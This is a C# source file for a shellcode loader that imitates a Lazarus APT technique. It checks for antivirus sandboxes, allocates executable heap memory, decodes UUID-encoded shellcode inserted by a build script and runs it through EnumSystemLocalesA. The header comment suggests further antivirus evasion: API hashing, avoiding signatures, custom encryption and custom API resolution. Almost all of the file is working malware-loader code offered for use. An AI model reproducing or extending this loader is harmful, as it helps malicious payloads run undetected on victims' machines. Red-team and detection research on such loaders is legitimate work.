using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics; // For debug printing

/*  Executes a shellcode locally using the HeapCreate + UUIDFromStringA + EnumSystemLocales A chain created by the Lazarus APT
    This is a very simple loader that has a number of areas for improvement for OPSEC
    As a challenge, try to take the following steps:
        1. Remove the suspicious WinAPI strings in DInvoke. Perhaps take a look at API hashing?
            a. Don't forget to change the names of the delegates (e.g. dEnumSystemLocalesA) and the functions (notEnumSystemLocalesA)
            b. You may need to recall the PE file format and write your own parser. Using someone else's *may* be sigged
        2. Avoid the RWX memory allocation for our HeapCreate. Consider starting as RW, then switching to RX
        3. You may want to have some more robust sandbox detection mechanisms, but be sure to use ones that aren't flagged
        4. UUIDs don't provide a great way of hiding our payload. Maybe add another encryption mechanism before running it?
            a. Don't just import the AES library, as that will be seen. Maybe it's time to roll your own crypto >:)
        5. Extra Mile: Use a custom implementation of LoadLibrary and GetProcAddress with API hashing
*/

class Lazarus
{
    public static void Main(string[] args)
    {
        // This API is a classic because it's not emulated by most sandboxes. If it returns NULL, then we're in an AV sandbox.
        IntPtr memNumaCheck = DInvoke.notVirtualAllocExNuma(DInvoke.notGetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (memNumaCheck == IntPtr.Zero) { return; }

        // Same as above
        IntPtr flsCheck = DInvoke.notFlsAlloc(IntPtr.Zero);
        if (flsCheck == IntPtr.Zero) { return; }

        // THIS GETS REPLACED WITH THE SHELLCODE BY THE BUILD SCRIPT
        // Note that this only works with relatively small shellcodes. If you try to throw a Sliver beacon in here, it will explode
        string[] uuids = {};
        
        // Create some RWX memory on the heap
        var heapHandle = (IntPtr)DInvoke.notHeapCreate((uint)0x00040000 /* PAGE_EXECUTE_READWRITE */, UIntPtr.Zero, UIntPtr.Zero );
        Debug.WriteLine("[+] Allocated memory with HeapCreate");
        IntPtr newHeapAddr = IntPtr.Zero;
        
        // Convert our UUIDs into shellcode
        for (int i = 0; i < uuids.Length; i++)
        {
            newHeapAddr = IntPtr.Add(heapHandle, 16 * i);
            var status = (IntPtr)DInvoke.notUuidFromStringA(uuids[i], newHeapAddr);
            if (status != IntPtr.Zero /*RPC_S_OK*/) {
                Debug.WriteLine("[!] Error converting UUID into shellcode: %lu", status);
            }
        }

        Debug.WriteLine("[+] Wrote memory with UuidFromStringA");
        Debug.WriteLine("[+] Executing Shellcode");
        
        // Execute
        var result = DInvoke.notEnumSystemLocalesA(heapHandle, 0);
        if (!result) {
            Debug.WriteLine("[!] EnumSystemLocalesA returned false!");
        }
    }
}